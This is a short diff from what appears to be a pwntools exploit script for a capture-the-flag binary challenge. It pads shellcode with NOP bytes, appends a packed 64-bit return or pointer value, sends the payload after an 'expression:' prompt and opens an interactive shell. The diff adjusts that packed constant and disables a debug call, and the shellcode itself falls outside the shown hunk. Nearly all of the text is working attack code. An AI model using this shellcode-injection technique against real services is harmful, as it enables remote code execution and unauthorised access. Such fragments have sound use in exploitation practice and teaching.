@@ -21,8 +21,8 @@ shellcode = asm('''
 '''
 )
 print(hex(len(shellcode)))
-pay = b'1 1 0000' + shellcode.ljust(0x48, b'\x90') + p64(0x400000000000b6eb)
+pay = b'1 1 0000' + shellcode.ljust(0x48, b'\x90') + p64(0x3ff000000000b6eb)
 print(hex(len(pay)))
-debug()
+#debug()
 io.sendafter(b'expression:\n', pay)
 io.interactive()
